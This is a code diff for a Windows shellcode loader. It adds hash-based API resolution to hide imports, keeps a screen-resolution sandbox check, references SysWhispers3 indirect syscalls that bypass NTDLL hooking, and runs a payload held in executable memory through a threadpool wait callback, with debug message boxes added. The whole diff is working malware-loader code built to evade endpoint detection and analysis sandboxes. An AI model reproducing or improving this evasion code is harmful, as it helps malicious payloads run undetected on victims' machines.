@@ -1,4 +1,4 @@
-/* Calls syscalls indirectly, bypassing userland hooking of the NTDLL. It does this using Syswhispers3 */
+/* Execute payload using threadpool */
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -243,7 +243,10 @@ BOOL CALLBACK resolution_callback(HMONITOR monitor, HDC hdc, LPRECT lprect, LPAR
 	int X = 0, Y = 0;
 	MONITORINFO MI = { .cbSize = sizeof(MONITORINFO) };
 
-	if (!GetMonitorInfoW(monitor, &MI)) {
+	HMODULE user32_module = get_module_handle_hash(USER32DLL_HASH);
+	fnGetMonitorInfoW pGetMonitorInfoW = get_proc_address_hash(user32_module, GetMonitorInfoW_HASH);
+
+	if (!pGetMonitorInfoW(monitor, &MI)) {
 		return FALSE;
 	}
 
@@ -271,7 +274,9 @@ BOOL check_resolution() {
 	BOOL	SANDBOX = FALSE;
 
 	// SANDBOX will be set to TRUE by 'EnumDisplayMonitors' if a sandbox is detected
-	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)resolution_callback, (LPARAM)(&SANDBOX));
+	HMODULE user32_module = get_module_handle_hash(USER32DLL_HASH);
+	fnEnumDisplayMonitors pEnumDisplayMonitors = get_proc_address_hash(user32_module, EnumDisplayMonitors_HASH);
+	pEnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)resolution_callback, (LPARAM)(&SANDBOX));
 
 	return SANDBOX;
 }
@@ -362,20 +367,29 @@ int main() {
 	// Change protection of virtual memory, less suspicious
 	Sw3NtProtectVirtualMemory((HANDLE)-1, &executable_memory, &alloc_size, PAGE_EXECUTE_READ, &old_protect);
 
-	//fnCreateEventA pCreateEventA = get_proc_address_hash(KERNEL32DLL_HASH, CreateEventA_HASH);
-	//fnCreateThreadpoolWait pCreateThreadpoolWait = get_proc_address_hash(KERNEL32DLL_HASH, CreateThreadpoolWait_HASH);
-	//fnSetThreadpoolWait pSetThreadpoolWait = get_proc_address_hash(KERNEL32DLL_HASH, SetThreadpoolWait_HASH);
+	fnCreateEventA pCreateEventA = get_proc_address_hash(kernelbase_module, CreateEventA_HASH);
+	fnCreateThreadpoolWait pCreateThreadpoolWait = get_proc_address_hash(kernelbase_module, CreateThreadpoolWait_HASH);
+	fnSetThreadpoolWait pSetThreadpoolWait = get_proc_address_hash(kernel32_module, SetThreadpoolWait_HASH);
+	
+	char buffer[64];
+	wsprintfA(buffer, "Pointer: %p", pSetThreadpoolWait);  // wsprintfA supports %p
+	MessageBoxA(NULL, buffer, "Debug", MB_OK);
 
-	//HANDLE event = pCreateEventA(NULL, FALSE, TRUE, NULL);
-	//PTP_WAIT threadPoolWait = pCreateThreadpoolWait((PTP_WAIT_CALLBACK)executable_memory, NULL, NULL);
-	//pSetThreadpoolWait(threadPoolWait, event, NULL);
-	//Sw3NtWaitForSingleObject(event, FALSE, INFINITE);
+
+	HANDLE event = pCreateEventA(NULL, FALSE, TRUE, NULL);
+	MessageBoxA(NULL, "1", "", NULL);
+	PTP_WAIT threadPoolWait = pCreateThreadpoolWait((PTP_WAIT_CALLBACK)executable_memory, NULL, NULL);
+	MessageBoxA(NULL, "2", "", NULL);
+	pSetThreadpoolWait(threadPoolWait, event, NULL);
+	MessageBoxA(NULL, "3", "", NULL);
+	Sw3NtWaitForSingleObject(event, FALSE, INFINITE);
+	MessageBoxA(NULL, "4", "", NULL);
 	
 
-	HANDLE event = CreateEventA(NULL, FALSE, TRUE, NULL);
-	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)executable_memory, NULL, NULL);
-	SetThreadpoolWait(threadPoolWait, event, NULL);
-	Sw3NtWaitForSingleObject(event, FALSE, INFINITE);
+	////HANDLE event = CreateEventA(NULL, FALSE, TRUE, NULL);
+	////PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)executable_memory, NULL, NULL);
+	////SetThreadpoolWait(threadPoolWait, event, NULL);
+	////Sw3NtWaitForSingleObject(event, FALSE, INFINITE);
 
 	// Replacement for getchar(), since getchar() is in the CRT
 	HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
